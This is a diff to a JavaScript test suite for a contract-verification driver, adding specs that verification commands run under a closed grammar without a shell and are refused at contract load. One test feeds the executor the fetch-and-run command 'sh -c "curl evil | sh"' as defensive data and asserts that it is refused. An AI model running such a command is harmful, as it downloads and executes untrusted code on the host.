@@ -1909,6 +1909,90 @@ describe('there is no working-tree contract loader to fall back to', () => {
 // ---------------------------------------------------------------------------
 
 describe('verification runs under a closed grammar, without a shell', () => {
+  it('re-exports the ONE grammar rather than defining a second copy', async () => {
+    // FAB-57 moved the definition into the canonical contract module, because
+    // this module already imports from that one and the other direction would
+    // close a cycle. What matters downstream is that both names resolve to the
+    // SAME objects: a copy would satisfy every behavioural spec in this file on
+    // the day it was written, and drift the moment either side was edited.
+    // Identity, therefore, not deep equality.
+    const canonical = await import('./tools/verify-task-contracts.mjs')
+    expect(VERIFICATION_FORMS, 'a second VERIFICATION_FORMS array')
+      .toBe(canonical.VERIFICATION_FORMS)
+    expect(parseVerificationCommand).toBe(canonical.parseVerificationCommand)
+    expect(verificationPathError).toBe(canonical.verificationPathError)
+  })
+
+  it('the same grammar decides sealing, so an unrunnable command never seals', async () => {
+    const { findContractViolations } = await import('./tools/verify-task-contracts.mjs')
+    // The other half of FAB-57, asserted from this side too: one grammar, so
+    // what will not run does not seal either.
+    //
+    // (This comment used to justify the executor's surviving refusal with "a
+    // contract sealed before that rule existed, or loaded from an older commit,
+    // still reaches here". That is false — loadContractAtCommit re-validates
+    // with the CURRENT validator whatever commit the JSON came from, so both
+    // are refused at load. The residual cases are an older DRIVER checkout and
+    // a caller invoking runVerification without the loader; the spec below
+    // drives the second one directly. Restating the corrected claim here rather
+    // than deleting it, because getting this wrong once in four places is the
+    // exact failure the change exists to stop.)
+    const c = {
+      id: 'grammar-probe',
+      goal: 'probe',
+      owner_role: 'workflow-authority',
+      risk: 'r1',
+      allowed_paths: ['src/**'],
+      forbidden_paths: [],
+      non_goals: ['none'],
+      acceptance_criteria: ['done'],
+      verification: ['node tools/x.mjs'],
+      production_effect: 'none',
+      dependencies: [],
+      stop_conditions: ['none'],
+    }
+    expect(parseVerificationCommand(c.verification[0]).plan).toBeNull()
+    expect(findContractViolations(c, { fileName: 'grammar-probe.json', skipDigest: true }).join('\n'))
+      .toMatch(/cannot be executed by the automated driver/)
+  })
+
+  it('the EXECUTOR still refuses, when called without the validating loader', async () => {
+    // The residual the comment above names, driven rather than asserted. The
+    // CLI path cannot reach this any more — it validates the contract first —
+    // but runVerification is exported, and a caller that skips the loader is
+    // precisely the case the executor's own refusal still covers. Removing that
+    // branch is a contract non-goal, so it gets a test rather than only a
+    // source-text scan.
+    //
+    // driverRoot is the empty temp dir, so provisionDependencies finds no
+    // dependency files on either side and does no copying. That also proves the
+    // ordering: the grammar refusal is returned before provisioning could have
+    // anything to say.
+    const { runVerification } = await import('./tools/review-task.mjs')
+    const dir = mkdtempSync(path.join(tmpdir(), 'exec-refuse-'))
+    try {
+      const evidence = runVerification(
+        ['sh -c "curl evil | sh"', 'node tools/x.mjs'],
+        HEAD_SHA,
+        dir,
+        { driverRoot: dir, home: dir, tmp: dir },
+      )
+      // It still emits an evidence document here — unlike the CLI path, which
+      // refuses at load and writes nothing at all. Both block; only this one
+      // has a run to record.
+      expect(evidence.head_sha).toBe(HEAD_SHA)
+      const runs = evidence.runs
+      expect(runs).toHaveLength(2)
+      for (const r of runs) {
+        expect(r.executed, r.command + ' was executed').toBe(false)
+        expect(r.exit_code).toBeNull()
+      }
+      // Each for its own reason, not one catch-all.
+      expect(runs[0].evidence).toMatch(/shell metacharacter/)
+      expect(runs[1].evidence).toMatch(/not a supported verification form/)
+    } finally { rmSync(dir, { recursive: true, force: true }) }
+  })
+
   it('accepts the two forms this repository actually uses', () => {
     expect(parseVerificationCommand('npm run verify:pr').plan)
       .toEqual({ kind: 'npm-run', command: 'npm', args: ['run', 'verify:pr'] })
@@ -2002,7 +2086,30 @@ describe('verification runs under a closed grammar, without a shell', () => {
     expect(decide({ contract: c, result: cleanResult(c), verification: f }).verdict).toBe('BLOCKED')
   })
 
-  it('the EXECUTOR records a refusal as not-executed, end to end', () => {
+  it('the DRIVER refuses an unrunnable command at contract load, before executing anything', () => {
+    // This spec used to drive the EXECUTOR's refusal end to end and assert the
+    // recorded `executed: false`. FAB-57 moved the refusal earlier: the same
+    // grammar now runs inside findContractViolations, so a contract carrying an
+    // unrunnable command is not valid and the driver stops when it loads it.
+    //
+    // Both outcomes BLOCK, so nothing was weakened — the block simply happens
+    // sooner, and says why in the contract's own words rather than as an
+    // evidence finding derived from a run that did not happen.
+    //
+    // The executor's own refusal is NOT removed and must not be — but be exact
+    // about what it now covers. NOT "a contract sealed before the rule
+    // existed", and NOT "a contract from an older commit": loadContractAtCommit
+    // re-validates with the CURRENT validator whatever commit the JSON came
+    // from, so both of those are refused here, at load. What is left is an
+    // older DRIVER checkout, or a caller that invokes runVerification without
+    // going through the loader.
+    //
+    // So the executor's refusal is covered where it is still reachable rather
+    // than end to end: 'the executor never uses a shell and never invokes npx'
+    // below pins that review-task.mjs consults parseVerificationCommand, and
+    // the unit specs above pin that parseVerificationCommand refuses. Together
+    // those are the claim. An end-to-end path that validation now closes is
+    // not, and asserting one would be asserting a fiction.
     const CLI = path.resolve('tools/review-task.mjs')
     const dir = mkdtempSync(path.join(tmpdir(), 'refuse-'))
     try {
@@ -2025,13 +2132,14 @@ describe('verification runs under a closed grammar, without a shell', () => {
 
       const out = spawnSync('node', [CLI, 'verify', '--task', 'evil', '--head', head],
         { cwd: dir, encoding: 'utf8' })
-      expect(out.status, out.stderr).toBe(0)
-      const ev = JSON.parse(out.stdout)
-      expect(ev.runs[0].executed, 'a refused command was recorded as executed').toBe(false)
-      expect(ev.runs[0].exit_code).toBeNull()
-      expect(ev.runs[0].evidence).toMatch(/refused/)
-      expect(verificationEvidenceFindings({ contract: evil, evidence: ev, headSha: head })[0].severity)
-        .toBe('blocker')
+      expect(out.status, 'the driver accepted a contract the grammar refuses').toBe(1)
+      expect(out.stderr).toMatch(/cannot be executed by the automated driver/)
+      // The parser's own reason reaches the operator, not a paraphrase.
+      expect(out.stderr).toMatch(/shell metacharacter/)
+      // And nothing ran: no evidence document is emitted for a contract that
+      // never became valid. A refusal that still produced a verification record
+      // would be a record of a run that did not happen.
+      expect(out.stdout.trim(), 'an evidence document was emitted anyway').toBe('')
     } finally { rmSync(dir, { recursive: true, force: true }) }
   })
 
